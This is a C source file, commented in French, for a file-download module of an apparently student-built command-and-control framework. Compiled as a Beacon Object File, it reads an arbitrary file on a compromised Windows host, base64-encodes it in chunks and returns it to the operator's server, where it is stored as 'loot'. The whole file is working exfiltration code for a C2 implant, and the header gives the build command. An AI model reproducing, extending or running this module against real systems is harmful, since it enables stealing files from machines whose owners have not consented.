/*
 * ============================================================
 *  modules/bof/mod_download.c — Téléchargement d'un fichier (BOF/RDLL)
 *
 *  Lit un fichier sur la machine cible, l'encode en base64 et
 *  l'envoie au serveur via BeaconOutput. Le serveur décode et
 *  sauvegarde dans server/loot/<agent_id>/<filename>.
 *
 *  Protocole :
 *    - L'agent reçoit la commande "download C:\path\to\file"
 *    - Le module ouvre le fichier, lit tout son contenu
 *    - Encode en base64 par chunks de 384 KB
 *    - Retourne uniquement la chaîne base64 (rien d'autre)
 *    - Le serveur (module=="download") décode et sauvegarde
 *
 *  Compilation BOF :
 *    x86_64-w64-mingw32-gcc -c -DBOF_MODE -o download.x64.o mod_download.c
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#include "beacon.h"

/* ── Déclarations Windows API (BOF mode uniquement) ──────────
 * En RDLL mode, windows.h fournit déjà ces déclarations.     */
#ifndef RDLL_MODE

#define GENERIC_READ       0x80000000
#define OPEN_EXISTING      3
#define FILE_ATTRIBUTE_NORMAL 0x80
#define INVALID_FILE_SIZE  ((DWORD)0xFFFFFFFF)

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT WINBASEAPI DWORD  WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD,
    LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(void);

#endif /* !RDLL_MODE */

#ifndef INVALID_HANDLE_VALUE
#  define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#endif
#ifndef HEAP_ZERO_MEMORY
#  define HEAP_ZERO_MEMORY  0x00000008
#endif

/* ── Encodage base64 inline ─────────────────────────────────── */
static const char B64DL[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static int b64_encode_buf(const unsigned char *in, int in_len,
                          char *out, int out_max) {
    int out_len = 0;
    for (int i = 0; i < in_len && out_len + 4 < out_max; i += 3) {
        unsigned int b0 = (unsigned char)in[i];
        unsigned int b1 = (i+1 < in_len) ? (unsigned char)in[i+1] : 0;
        unsigned int b2 = (i+2 < in_len) ? (unsigned char)in[i+2] : 0;
        out[out_len++] = B64DL[ b0 >> 2];
        out[out_len++] = B64DL[(b0 & 3) << 4 | b1 >> 4];
        out[out_len++] = (i+1 < in_len) ? B64DL[(b1 & 15) << 2 | b2 >> 6] : '=';
        out[out_len++] = (i+2 < in_len) ? B64DL[ b2 & 63]                  : '=';
    }
    out[out_len] = '\0';
    return out_len;
}


/* ── Fonction d'entrée BOF ────────────────────────────────── */

void go(char *args, int args_len) {
    datap parser;
    int   full_len = 0;

    BeaconDataParse(&parser, args, args_len);
    char *full_cmd = BeaconDataExtract(&parser, &full_len);

    if (!full_cmd || full_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Chemin de fichier manquant\n");
        return;
    }

    /* Extraire le chemin depuis "download C:\path" ou directement "C:\path".
     * Copier dans un buffer null-terminé — BeaconDataExtract ne garantit pas
     * de null après les données extraites, et CreateFileA en a besoin. */
    char filepath[1024] = {0};
    int  path_start = 0;
    for (int i = 0; i < full_len; i++) {
        if (full_cmd[i] == ' ') { path_start = i + 1; break; }
    }
    int path_len = full_len - path_start;
    if (path_len <= 0 || path_len >= (int)sizeof(filepath)) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Chemin invalide ou trop long\n");
        return;
    }
    __builtin_memcpy(filepath, full_cmd + path_start, (SIZE_T)path_len);
    /* filepath[path_len] = '\0'; déjà 0 grâce à = {0} */

    /* Ouvrir le fichier */
    HANDLE hf = KERNEL32$CreateFileA(
        filepath, GENERIC_READ, 0x01 /* FILE_SHARE_READ */, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );
    if (hf == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] Impossible d'ouvrir '%s'\n", filepath);
        return;
    }

    /* Taille du fichier */
    DWORD size_high = 0;
    DWORD size_low  = KERNEL32$GetFileSize(hf, &size_high);
    if (size_low == INVALID_FILE_SIZE || size_high != 0) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] Fichier trop grand ou GetFileSize échoué\n");
        KERNEL32$CloseHandle(hf);
        return;
    }
    if (size_low == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Fichier vide\n");
        KERNEL32$CloseHandle(hf);
        return;
    }

    /* Allouer le buffer de lecture */
    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *buf = (unsigned char *)KERNEL32$HeapAlloc(heap, 0, size_low);
    if (!buf) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[ERREUR] Allocation mémoire échouée (%lu bytes)\n",
                     (unsigned long)size_low);
        KERNEL32$CloseHandle(hf);
        return;
    }

    /* Lire le fichier complet */
    DWORD bytes_read = 0;
    BOOL  ok = KERNEL32$ReadFile(hf, buf, size_low, &bytes_read, NULL);
    KERNEL32$CloseHandle(hf);

    if (!ok || bytes_read != size_low) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Lecture incomplète (%lu/%lu)\n",
                     (unsigned long)bytes_read, (unsigned long)size_low);
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }

    /* Encoder en base64 par chunks de 384 KB pour éviter stack overflow */
    const int CHUNK = 384 * 1024;
    int b64_cap = ((CHUNK + 2) / 3) * 4 + 4;
    char *b64buf = (char *)KERNEL32$HeapAlloc(heap, 0, (SIZE_T)b64_cap);
    if (!b64buf) {
        BeaconPrintf(CALLBACK_ERROR, "[ERREUR] Allocation buffer base64 échouée\n");
        KERNEL32$HeapFree(heap, 0, buf);
        return;
    }

    DWORD offset = 0;
    while (offset < size_low) {
        DWORD n = (size_low - offset > (DWORD)CHUNK)
                  ? (DWORD)CHUNK : size_low - offset;
        int b64_len = b64_encode_buf(buf + offset, (int)n, b64buf, b64_cap);
        BeaconOutput(CALLBACK_OUTPUT, b64buf, b64_len);
        offset += n;
    }

    KERNEL32$HeapFree(heap, 0, b64buf);
    KERNEL32$HeapFree(heap, 0, buf);
}
